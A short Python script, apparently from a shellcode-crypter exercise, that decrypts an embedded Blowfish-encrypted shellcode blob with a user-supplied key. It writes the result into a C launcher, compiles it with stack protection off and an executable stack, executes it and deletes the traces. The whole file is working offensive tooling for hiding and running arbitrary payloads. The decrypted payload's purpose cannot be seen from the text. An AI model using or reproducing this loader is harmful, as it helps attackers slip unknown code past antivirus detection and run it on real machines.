#!/usr/bin/env python3

import blowfish
import os
import sys

shellcode = b"\x69\x0d\xeb\x9f\x3a\xc6\xc8\x06\x7d\xed\x0c\xec\xcf\x4c\x8e\x2a\xcb\x64\x2f\x39\x28\x2d\x5b\x32\xa7\x61\xf8\x4d\x9b\x73\x47\x11\xfe\x89\x06\x71\x58\x41\x87\x7b\xda\x9a\x6d\xe8\x9b\x9e\xc4\xa6\x5b\x37\xb7\x0e\x8f\x4a\x54\x37\x19\x43\xb6\xe3\x87\x6c\x8c\xf5\x34\xdb\x5b\xf3\x36\x69\x56\xae\xb2\xaa\x06\x16\x80\x2e\x27\x3b\x0a\x8b\xc7\xbf\x2e\xb8\x23\x26\x3b\xb6\x4d\xae\x72\x25\x7d\x52\xa2\xb9\x4f\x00\xf4\xf8\xcb\x43\x5c\x62\x8d\x05\x14\x20\x34\xd8\x0e\xfc\x7a\x85\xe2\x36\x7b\xd1\x61\x34\xcd\x5c\x38\x15\xca\xb6\x70\xd7\xea\xa5\x6e\x84\xd8\xe3\xae\xb7\xfb\x12\xb5\x2e\xbb\xa5\xfc\xf2\x40\xb1\xd9\x1d\x43\x03\x0b\x07\xe9\xd5\xeb\xcb\x11\xce"

uncrypted = b""

byte_shellcode = bytearray(shellcode)

key = input("Key to decrypt the shellcode : ")

if len(key) < 4 or len(key) > 56:
    print("Key length invalid : Must be between (4->56) characters ...")
    sys.exit(-1)

cipher = blowfish.Cipher(key.encode())

l = ((len(byte_shellcode)) / 8 ) + 1
p = 0
i = 1

while i < l:
    block = byte_shellcode[p:8*i]
    uncrypted += cipher.decrypt_block(block)
    i += 1
    p += 8

c = ""
unc = ""

for x in bytearray(byte_shellcode):
    c += "\\x%02x" % x

for x in bytearray(uncrypted):
    unc += "\\x%02x" % x


print("Before decryption : ")
print(c)
print("After decryption : ")
print(unc)

print("\nExecuting now ....")

file = open("121.c","w")
file.write('''
#include <stdio.h>

int main(){
    unsigned char code[] = \"'''+ unc + '''";
    int (*ret)() = (int(*)())code;
    ret();
}

        ''')

file.close()
os.system("gcc -fno-stack-protector -z execstack -o 121 121.c")
os.system("./121")
os.system("rm 121 121.c")

